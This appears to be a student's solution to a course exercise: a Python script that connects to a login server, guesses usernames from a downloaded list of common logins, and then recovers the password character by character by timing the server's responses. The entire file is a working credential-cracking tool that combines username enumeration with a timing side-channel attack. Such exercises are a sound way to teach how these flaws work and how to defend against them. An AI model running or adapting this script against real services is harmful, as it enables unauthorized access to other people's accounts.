# write your code here
import sys
import socket
from itertools import product
from urllib.request import urlopen
from json import dumps, loads
from datetime import datetime


def login_with(log, pas, sock):
    message = {"login": log,
               "password": pas}
    message = dumps(message).encode()
    try:
        sock.send(message)
        response = sock.recv(1024)
        response = response.decode()
        response = loads(response)
        return response["result"]
    except ConnectionAbortedError:
        return "ConnectionAborted"


args = sys.argv
hostname = args[1]
port = int(args[2])
address = (hostname, port)
result = {"login": '',
          "password": ''}
password_alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

url_logins = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'
with urlopen(url_logins) as logins:
    popular_logins = [login.decode().strip() for login in logins]

with socket.socket() as client:
    client.connect(address)
    for login in popular_logins:
        connection_result = login_with(login, '\0', client)
        if connection_result == "Wrong password!":
            result["login"] = login
            break
    password = ['']
    firstLetters = {}
    for letter in password_alphabet:
        password[0] = letter
        start = datetime.now()
        connection_result = login_with(result["login"], password[0], client)
        finish = datetime.now()
        total_time = finish - start
        firstLetters[total_time] = letter
    error_time = max(firstLetters)
    password[0] = firstLetters[error_time]
    password.append('')
    while True:
        for letter in password_alphabet:
            password[-1] = letter
            pswd = ''.join(password)
            start = datetime.now()
            connection_result = login_with(result["login"], pswd, client)
            finish = datetime.now()
            total_time = finish - start
            if connection_result == "Connection success!":
                result["password"] = pswd
                break
            elif total_time > (error_time / 2):
                password.append('')
                break
            elif connection_result in ("Wrong password!", "ConnectionAborted"):
                continue
        if result["password"] != '':
            break
    print(dumps(result, indent=4))